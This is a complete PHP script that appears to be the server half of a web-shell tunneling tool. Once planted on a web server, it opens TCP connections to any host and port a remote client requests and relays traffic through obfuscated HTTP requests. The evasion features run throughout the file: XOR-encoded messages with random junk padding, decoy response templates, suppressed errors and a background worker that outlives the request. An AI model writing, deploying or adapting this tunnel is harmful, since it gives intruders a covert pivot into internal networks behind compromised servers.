<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set('allow_url_fopen', true);
ini_set('allow_url_include', true);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '256M');

// Disable output buffering
@ini_set('zlib.output_compression', 0);
@ini_set('output_buffering', 'off');
@ini_set('implicit_flush', 1);
ob_implicit_flush(true);
while (ob_get_level()) {
    ob_end_clean();
}

if (version_compare(PHP_VERSION, '5.4.0', '>=')) {
    @http_response_code(200);
}

// Session configuration - use standard cookie-based sessions
@ini_set('session.use_cookies', true);
@ini_set('session.use_only_cookies', true);
@ini_set('session.use_trans_sid', false);
@ini_set('session.cache_limiter', '');
@ini_set('session.cookie_httponly', true);
@ini_set('session.save_path', sys_get_temp_dir());

// Constants
define('BUF_SIZE', 1024 * 16);
define('MAX_READ_SIZE', 512 * 1024); // 512KB

// ============================================================================
// Base64 URL-safe encoding/decoding
// ============================================================================

function base64UrlEncode($data) {
    $encoded = base64_encode($data);
    $encoded = str_replace('+', '-', $encoded);
    $encoded = str_replace('/', '_', $encoded);
    $encoded = rtrim($encoded, '=');
    return $encoded;
}

function base64UrlDecode($data) {
    $data = str_replace('-', '+', $data);
    $data = str_replace('_', '/', $data);
    $padding = strlen($data) % 4;
    if ($padding) {
        $data .= str_repeat('=', 4 - $padding);
    }
    return base64_decode($data);
}

// ============================================================================
// Protocol marshal/unmarshal
// ============================================================================

function marshalBase64($m) {
    // Add junk data (0~32 random bytes)
    $junkSize = mt_rand(0, 32);
    if ($junkSize > 0) {
        $junk = '';
        for ($i = 0; $i < $junkSize; $i++) {
            $junk .= chr(mt_rand(0, 255));
        }
        $m['_'] = $junk;
    }

    // Serialize map
    $buf = '';
    foreach ($m as $key => $value) {
        $buf .= chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
    }

    // XOR encryption
    $xorKey = array(mt_rand(1, 255), mt_rand(1, 255));
    $data = '';
    for ($i = 0; $i < strlen($buf); $i++) {
        $data .= chr(ord($buf[$i]) ^ $xorKey[$i % 2]);
    }
    $data = base64UrlEncode($data);

    // Build header
    $header = pack('C2N', $xorKey[0], $xorKey[1], strlen($data));
    // XOR header length bytes
    $headerBytes = unpack('C*', $header);
    for ($i = 3; $i <= 6; $i++) {
        $headerBytes[$i] = $headerBytes[$i] ^ $xorKey[($i - 1) % 2];
    }
    $header = '';
    foreach ($headerBytes as $byte) {
        $header .= chr($byte);
    }
    $header = base64UrlEncode($header);

    return $header . $data;
}

function unmarshalBase64($input) {
    $m = array();

    // Read 8 bytes header
    $header = fread($input, 8);
    if (strlen($header) !== 8) {
        return $m;
    }

    $header = base64UrlDecode($header);
    if (!$header || strlen($header) < 6) {
        return $m;
    }

    $headerBytes = unpack('C*', $header);
    $xorKey = array($headerBytes[1], $headerBytes[2]);

    // Decrypt length (bytes 3-6)
    for ($i = 3; $i <= 6; $i++) {
        $headerBytes[$i] = $headerBytes[$i] ^ $xorKey[($i - 1) % 2];
    }
    // Parse 4-byte length (big-endian)
    $length = ($headerBytes[3] << 24) | ($headerBytes[4] << 16) | ($headerBytes[5] << 8) | $headerBytes[6];

    if ($length > 32 * 1024 * 1024) {
        throw new Exception('invalid length');
    }

    // Read data
    $data = stream_get_contents($input, $length);
    if (strlen($data) !== $length) {
        throw new Exception('invalid data length');
    }

    $data = base64UrlDecode($data);
    if (!$data) {
        return $m;
    }

    // Decrypt data
    $decrypted = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $decrypted .= chr(ord($data[$i]) ^ $xorKey[$i % 2]);
    }

    // Parse map
    $i = 0;
    $len = strlen($decrypted);
    while ($i < $len) {
        if ($i + 1 > $len) break;
        $kLen = ord($decrypted[$i]);
        $i++;

        if ($i + $kLen > $len) break;
        $key = substr($decrypted, $i, $kLen);
        $i += $kLen;

        if ($i + 4 > $len) break;
        $vLenBytes = unpack('N', substr($decrypted, $i, 4));
        $vLen = $vLenBytes[1];
        $i += 4;

        if ($vLen < 0 || $i + $vLen > $len) break;
        $value = substr($decrypted, $i, $vLen);
        $i += $vLen;

        $m[$key] = $value;
    }

    return $m;
}

// ============================================================================
// Helper functions
// ============================================================================

function randomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $charactersLength = strlen($characters);
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $characters[mt_rand(0, $charactersLength - 1)];
    }
    return $result;
}

function newData($tunId, $data) {
    return array(
        'ac' => chr(0x01),
        'dt' => $data,
        'id' => $tunId
    );
}

function newDel($tunId) {
    return array(
        'ac' => chr(0x02),
        'id' => $tunId
    );
}

function newStatus($tunId, $status) {
    return array(
        'ac' => chr(0x03),
        's' => chr($status),
        'id' => $tunId
    );
}

function newHeartbeat($tunId) {
    return array(
        'ac' => chr(0x10),
        'id' => $tunId
    );
}

function newDirtyChunk($size) {
    $m = array('ac' => chr(0x11));
    if ($size > 0) {
        $data = '';
        for ($i = 0; $i < $size; $i++) {
            $data .= chr(mt_rand(0, 255));
        }
        $m['d'] = $data;
    }
    return $m;
}

function writeAndFlush($data, $dirtySize = 0) {
    if (!$data || strlen($data) === 0) {
        return;
    }
    echo $data;
    if ($dirtySize > 0) {
        echo marshalBase64(newDirtyChunk($dirtySize));
    }
    flush();
    if (function_exists('ob_flush')) {
        @ob_flush();
    }
}

function getKey($key) {
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    $value = isset($_SESSION[$key]) ? $_SESSION[$key] : null;
    session_write_close();
    return $value;
}

function putKey($key, $value) {
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    $_SESSION[$key] = $value;
    session_write_close();
}

function removeKey($key) {
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    if (isset($_SESSION[$key])) {
        unset($_SESSION[$key]);
    }
    session_write_close();
}

function processTemplateStart($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    header('Content-Type: ' . $tplParts[0]);
    return $tplParts[1];
}

function processTemplateEnd($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    return $tplParts[2];
}

function getDirtySize($sid) {
    $size = getKey($sid . '_jk');
    return ($size !== null) ? intval($size) : 0;
}

// ============================================================================
// Mode: Handshake (0x00)
// ============================================================================

function processHandshake($dataMap, $tunId) {
    $sid = randomString(16);

    // Parse template
    $tplData = isset($dataMap['tpl']) ? $dataMap['tpl'] : '';
    $contentTypeData = isset($dataMap['ct']) ? $dataMap['ct'] : '';

    if ($tplData && $contentTypeData) {
        $parts = explode('#data#', $tplData, 2);
        if (count($parts) === 2) {
            putKey($sid, array($contentTypeData, $parts[0], $parts[1]));
        } else {
            putKey($sid, array());
        }
    } else {
        putKey($sid, array());
    }

    // Parse dirty size
    $dirtySizeData = isset($dataMap['jk']) ? $dataMap['jk'] : '';
    if ($dirtySizeData) {
        $dirtySize = intval($dirtySizeData);
        if ($dirtySize < 0) {
            $dirtySize = 0;
        }
        putKey($sid . '_jk', $dirtySize);
    }

    // Parse auto mode
    $isAutoData = isset($dataMap['a']) ? $dataMap['a'] : '';
    $isAuto = $isAutoData && strlen($isAutoData) > 0 && ord($isAutoData[0]) === 0x01;

    $dtData = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if ($isAuto) {
        // Auto mode - streaming response
        header('X-Accel-Buffering: no');

        writeAndFlush(processTemplateStart($sid), 0);
        writeAndFlush(marshalBase64(newData($tunId, $dtData)), 0);

        sleep(2);

        writeAndFlush(marshalBase64(newData($tunId, $sid)), 0);
        writeAndFlush(processTemplateEnd($sid), 0);
    } else {
        // Normal mode - single response
        $response = processTemplateStart($sid);
        $response .= marshalBase64(newData($tunId, $dtData));
        $response .= marshalBase64(newData($tunId, $sid));
        $response .= processTemplateEnd($sid);

        header('Content-Length: ' . strlen($response));
        writeAndFlush($response, 0);
    }
}

// ============================================================================
// Mode: Half (0x02)
// ============================================================================

function processHalfStream($dataMap, $tunId, $sid) {
    $dirtySize = getDirtySize($sid);
    $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

    try {
        switch ($action) {
            case 0x00: // CREATE
                performHalfCreate($dataMap, $tunId, $dirtySize);
                break;

            case 0x01: // WRITE
                performWrite($dataMap, $tunId);
                break;

            case 0x02: // DELETE
                performDelete($tunId);
                break;

            case 0x10: // HEARTBEAT
                writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
    }
}

function performHalfCreate($dataMap, $tunId, $dirtySize) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    // Try to connect
    $socket = @fsockopen($host, $port, $errno, $errstr, 5);

    if (!$socket) {
        writeAndFlush(marshalBase64(newStatus($tunId, 0x01)), $dirtySize);
        return;
    }

    stream_set_blocking($socket, false);
    stream_set_timeout($socket, 0);

    // Initialize session
    putKey($tunId . '_ok', true);
    putKey($tunId . '_write_buf', '');

    // Send success status
    writeAndFlush(marshalBase64(newStatus($tunId, 0x00)), $dirtySize);

    // Enter read loop
    $lastActivityTime = time();
    while (true) {
        // Check if connection is still active
        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            break;
        }

        // Read from socket
        $read = array($socket);
        $write = null;
        $except = null;
        $result = @stream_select($read, $write, $except, 0, 50000); // 50ms timeout

        if ($result === false) {
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            if ($data === false || feof($socket)) {
                break;
            }
            if (strlen($data) > 0) {
                writeAndFlush(marshalBase64(newData($tunId, $data)), $dirtySize);
                $lastActivityTime = time();
            }
        }

        // Write to socket
        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);
            if ($written === false) {
                break;
            }
            $lastActivityTime = time();
        }

        // Timeout check (60 seconds)
        if (time() - $lastActivityTime > 60) {
            break;
        }
    }

    // Cleanup
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_write_buf');
    writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
}

// ============================================================================
// Mode: Classic (0x03)
// ============================================================================

function processClassic($dataMap, $tunId, $respBodyStream, &$needWorker, &$workerSocket, &$workerTunId) {
    $sendClose = true;

    try {
        $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

        switch ($action) {
            case 0x00: // CREATE
                $result = performClassicCreate($dataMap, $tunId);
                fwrite($respBodyStream, $result['data']);
                if ($result['socket']) {
                    $needWorker = true;
                    $workerSocket = $result['socket'];
                    $workerTunId = $tunId;
                }
                break;

            case 0x01: // WRITE + READ
                performWrite($dataMap, $tunId);
                $readData = performRead($tunId);
                fwrite($respBodyStream, $readData);
                break;

            case 0x02: // DELETE
                $sendClose = false;
                performDelete($tunId);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        if ($sendClose) {
            fwrite($respBodyStream, marshalBase64(newDel($tunId)));
        }
    }
}

function performClassicCreate($dataMap, $tunId) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    // Try to connect
    $socket = @fsockopen($host, $port, $errno, $errstr, 3);

    if (!$socket) {
        return array(
            'data' => marshalBase64(newStatus($tunId, 0x01)),
            'socket' => null
        );
    }

    stream_set_blocking($socket, false);
    stream_set_timeout($socket, 0);

    // Initialize session
    putKey($tunId . '_ok', true);
    putKey($tunId . '_read_buf', '');
    putKey($tunId . '_write_buf', '');

    // Return success response and socket for background worker
    return array(
        'data' => marshalBase64(newStatus($tunId, 0x00)),
        'socket' => $socket
    );
}

function classicBackgroundWorker($socket, $tunId) {
    @ignore_user_abort(true);
    @set_time_limit(0);

    $lastActivityTime = time();

    while (true) {
        // Check if connection is still active
        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            break;
        }

        // Read from socket
        $read = array($socket);
        $write = null;
        $except = null;
        $result = @stream_select($read, $write, $except, 0, 50000); // 50ms timeout

        if ($result === false) {
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            if ($data === false || feof($socket)) {
                break;
            }
            if (strlen($data) > 0) {
                // Append to read buffer
                if (session_status() === PHP_SESSION_NONE) {
                    @session_start();
                }
                if (!isset($_SESSION[$tunId . '_read_buf'])) {
                    $_SESSION[$tunId . '_read_buf'] = '';
                }
                $_SESSION[$tunId . '_read_buf'] .= $data;
                session_write_close();
                $lastActivityTime = time();
            }
        }

        // Write to socket
        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);
            if ($written === false) {
                break;
            }
            $lastActivityTime = time();
        }

        // Timeout check (300 seconds for classic mode)
        if (time() - $lastActivityTime > 300) {
            break;
        }
    }

    // Cleanup
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

function performWrite($dataMap, $tunId) {
    $data = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if (strlen($data) === 0) {
        return;
    }

    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    if (!isset($_SESSION[$tunId . '_write_buf'])) {
        $_SESSION[$tunId . '_write_buf'] = '';
    }
    $_SESSION[$tunId . '_write_buf'] .= $data;
    session_write_close();
}

function performRead($tunId) {
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    $readBuf = isset($_SESSION[$tunId . '_read_buf']) ? $_SESSION[$tunId . '_read_buf'] : '';

    // Limit to MAX_READ_SIZE and keep remaining data
    if (strlen($readBuf) > MAX_READ_SIZE) {
        $dataToSend = substr($readBuf, 0, MAX_READ_SIZE);
        $_SESSION[$tunId . '_read_buf'] = substr($readBuf, MAX_READ_SIZE);
    } else {
        $dataToSend = $readBuf;
        $_SESSION[$tunId . '_read_buf'] = '';
    }
    session_write_close();

    $response = '';
    if (strlen($dataToSend) > 0) {
        $response .= marshalBase64(newData($tunId, $dataToSend));
    }

    return $response;
}

function performDelete($tunId) {
    putKey($tunId . '_ok', false);
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

// ============================================================================
// Main entry point
// ============================================================================

function process() {
    $requestBody = file_get_contents('php://input');
    if (!$requestBody) {
        return;
    }

    $bodyStream = fopen('php://memory', 'r+');
    fwrite($bodyStream, $requestBody);
    rewind($bodyStream);

    try {
        $dataMap = unmarshalBase64($bodyStream);

        if (empty($dataMap)) {
            return;
        }

        $mode = isset($dataMap['m']) ? $dataMap['m'] : '';
        $action = isset($dataMap['ac']) ? $dataMap['ac'] : '';
        $tunId = isset($dataMap['id']) ? $dataMap['id'] : '';
        $sidData = isset($dataMap['sid']) ? $dataMap['sid'] : '';

        if (!$action || strlen($action) !== 1 || !$tunId || !$mode || strlen($mode) !== 1) {
            return;
        }

        $sid = $sidData ? $sidData : '';
        $modeValue = ord($mode[0]);

        switch ($modeValue) {
            case 0x00: // Handshake
                processHandshake($dataMap, $tunId);
                break;

            case 0x02: // Half
                header('X-Accel-Buffering: no');

                $sid = isset($dataMap['sid']) ? $dataMap['sid'] : '';
                if (!$sid) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Verify session exists (check for null, not falsy, because empty array is valid)
                $sessionData = getKey($sid);
                if ($sessionData === null) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Read remaining body content
                $remainingBody = stream_get_contents($bodyStream);

                $dirtySize = getDirtySize($sid);

                writeAndFlush(processTemplateStart($sid), $dirtySize);

                // Process first operation
                processHalfStream($dataMap, $tunId, $sid);

                // Process remaining operations
                if (strlen($remainingBody) > 0) {
                    $bodyStream2 = fopen('php://memory', 'r+');
                    fwrite($bodyStream2, $remainingBody);
                    rewind($bodyStream2);

                    while (!feof($bodyStream2)) {
                        try {
                            $nextDataMap = unmarshalBase64($bodyStream2);
                            if (empty($nextDataMap)) {
                                break;
                            }
                            $tunId = isset($nextDataMap['id']) ? $nextDataMap['id'] : '';
                            processHalfStream($nextDataMap, $tunId, $sid);
                        } catch (Exception $e) {
                            break;
                        }
                    }
                    fclose($bodyStream2);
                }

                writeAndFlush(processTemplateEnd($sid), $dirtySize);
                break;

            case 0x03: // Classic
                $sid = isset($dataMap['sid']) ? $dataMap['sid'] : '';
                if (!$sid) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Verify session exists (check for null, not falsy, because empty array is valid)
                $sessionData = getKey($sid);
                if ($sessionData === null) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Read remaining body content
                $remainingBody = stream_get_contents($bodyStream);

                // Create response buffer
                $respBodyStream = fopen('php://memory', 'r+');
                fwrite($respBodyStream, processTemplateStart($sid));

                // Variables for background worker
                $needWorker = false;
                $workerSocket = null;
                $workerTunId = '';

                // Process first operation
                processClassic($dataMap, $tunId, $respBodyStream, $needWorker, $workerSocket, $workerTunId);

                // Process remaining operations
                if (strlen($remainingBody) > 0) {
                    $bodyStream2 = fopen('php://memory', 'r+');
                    fwrite($bodyStream2, $remainingBody);
                    rewind($bodyStream2);

                    while (!feof($bodyStream2)) {
                        try {
                            $nextDataMap = unmarshalBase64($bodyStream2);
                            if (empty($nextDataMap)) {
                                break;
                            }
                            $tunId = isset($nextDataMap['id']) ? $nextDataMap['id'] : '';
                            processClassic($nextDataMap, $tunId, $respBodyStream, $needWorker, $workerSocket, $workerTunId);
                        } catch (Exception $e) {
                            break;
                        }
                    }
                    fclose($bodyStream2);
                }

                fwrite($respBodyStream, processTemplateEnd($sid));

                // Send response
                rewind($respBodyStream);
                $response = stream_get_contents($respBodyStream);
                fclose($respBodyStream);

                header('Content-Length: ' . strlen($response));
                echo $response;
                flush();
                if (function_exists('ob_flush')) {
                    @ob_flush();
                }

                // Finish request and start background worker if needed
                if ($needWorker && $workerSocket) {
                    if (function_exists('fastcgi_finish_request')) {
                        fastcgi_finish_request();
                    }
                    classicBackgroundWorker($workerSocket, $workerTunId);
                }
                break;
        }

    } catch (Exception $e) {
        // Silent error handling
    } finally {
        fclose($bodyStream);
    }
}

// Start processing
process();
